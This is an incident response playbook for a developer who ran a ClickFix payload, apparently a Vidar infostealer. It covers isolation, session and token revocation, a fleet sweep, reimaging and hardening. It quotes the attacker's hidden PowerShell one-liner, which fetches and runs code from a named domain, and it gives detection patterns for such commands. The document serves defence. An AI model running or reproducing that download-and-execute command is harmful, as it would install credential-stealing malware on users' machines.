# ClickFix / Infostealer Incident Response Playbook

**Incident:** Developer executed a ClickFix payload via PowerShell:
`powershell -w h "iex(irm 'auth-id-browser.info/238afe5dfe3007db' -UseBasicParsing)"` — reported as a likely **Vidar Stealer** drop (browser credentials, session cookies, tokens).

**Working assumption:** treat exfiltration as **already complete**. Infostealers grab-and-go within seconds of execution; detection tooling confirms scope, it does not prevent the initial theft. Credential/session invalidation is the remediation that matters, and it is time-critical.

---

## Phase 1 — Contain (patient zero, immediately)

1. **Isolate the developer's machine** from the network (EDR isolate, pull cable, or disable NIC). Do not wipe yet — preserve for triage.
2. **Do not have the user "just change their password" from the infected machine.** All remediation happens from a known-clean device.
3. Capture volatile state if feasible before shutdown (running processes, network connections). `Invoke-ClickFixTriage.ps1` collects most of this read-only.

## Phase 2 — Invalidate everything the stealer could carry (within hours)

Vidar-class stealers take: saved browser passwords, **session cookies** (which bypass MFA), autofill data, crypto wallets, and local token caches. Password rotation alone is insufficient — stolen cookies keep working until the session is revoked.

| # | Action | How |
|---|--------|-----|
| 1 | Revoke ALL active sessions for the affected user | Entra ID: `Revoke-MgUserSignInSession -UserId <upn>` (Graph) or Entra portal → user → *Revoke sessions*. Repeat for Google Workspace/other IdPs if used. |
| 2 | Reset the user's AD / Entra password | From a clean admin workstation |
| 3 | Rotate every credential saved in the user's browsers | Enumerate via browser sync account; prioritise: VPN, Git platforms (Azure DevOps + GitHub), cloud portals (Azure), package registries, DB connection strings |
| 4 | Revoke and re-issue PATs, SSH keys, API keys the developer held | Azure DevOps PATs, GitHub PATs/SSH keys, Azure service principals secrets they had access to, npm/NuGet tokens |
| 5 | Check for attacker persistence in accounts | New inbox rules, new MFA devices, new OAuth app consents, new SSH keys on Git accounts, unfamiliar sign-in locations (Entra sign-in logs) |
| 6 | Rotate any shared secrets present on that machine | `.env` files, appsettings secrets, kubeconfig, cloud CLI token caches (`~/.azure`, `~/.aws`) |

## Phase 3 — Scope the blast radius (fleet sweep)

Run **`Invoke-ClickFixTriage.ps1`** on every Windows endpoint — one victim who mentions it usually means others who didn't.

```powershell
# Single machine (elevated)
.\Invoke-ClickFixTriage.ps1 -Verbose

# Fleet: deploy via Intune/ConfigMgr/GPO with central collection
.\Invoke-ClickFixTriage.ps1 -OutputPath "\\fileserver\ir-sweep\$env:COMPUTERNAME.json"
```

- Exit code `1` = actionable findings → treat that endpoint as suspect, repeat Phase 1–2 for its user.
- Extend IOCs as you learn more: `-IocDomain 'auth-id-browser.info','other.domain'` `-IocPattern '<other check codes>'`
- Also sweep **identity-side**: Entra sign-in logs for impossible travel / new devices across ALL staff, not only the known victim.
- Check firewall/proxy/DNS logs for any other host that resolved or contacted `auth-id-browser.info` — this is the most reliable fleet-wide signal if endpoint logging was thin.

## Phase 4 — Eradicate & recover (patient zero)

Reimage the developer's machine. Infostealers often drop secondary payloads/loaders; cleaning in place is not a deterministic outcome. Restore from known-good source, re-enrol, then apply Phase 5 hardening before returning it to the user.

## Phase 5 — Harden

Run **`Invoke-ClickFixHardening.ps1`** (supports `-WhatIf`):

```powershell
.\Invoke-ClickFixHardening.ps1 -All -WhatIf   # review
.\Invoke-ClickFixHardening.ps1 -All           # apply: sinkhole, 4104 logging, 4688 auditing, ASR rules
```

Beyond the script (organisational):

1. **DNS-layer blocking** of the IOC domain (and newly-registered-domain category) at your resolver/firewall — hosts-file sinkholing is endpoint-local only.
2. **Report the incident** — in the EU this may trigger NIS2/GDPR notification obligations depending on data accessed; loop in whoever owns compliance.
3. **User comms** — short internal note: nobody legitimate will ever ask you to paste a command into Win+R or a terminal. "Fix it yourself" CAPTCHA/error prompts are the tell. Praise the developer for self-reporting quickly; that behaviour is what you want repeated.
4. **Browser password managers**: consider disabling built-in browser password storage via policy in favour of a managed vault — it's the primary loot infostealers target.
5. If you have an EDR/SIEM: alert on `explorer.exe → powershell.exe` with `-w hidden`/`-enc`, and on RunMRU writes containing interpreter names.

## Verification checklist

- [ ] Patient zero isolated, then reimaged
- [ ] Sessions revoked + password reset for affected user (verify via Entra sign-in logs: old refresh tokens rejected)
- [ ] PATs / SSH keys / API keys rotated
- [ ] Fleet sweep complete; all exit-code-1 endpoints investigated
- [ ] DNS/proxy logs checked for other hosts contacting the IOC domain
- [ ] Hardening applied and confirmed by re-running triage (sinkhole shows as `Info`, 4104 events flowing)
- [ ] Incident documented (timeline, scope, actions) for post-incident review

---
*Scripts in this folder are read-only (triage) or opt-in idempotent (hardening). Nothing executes automatically.*
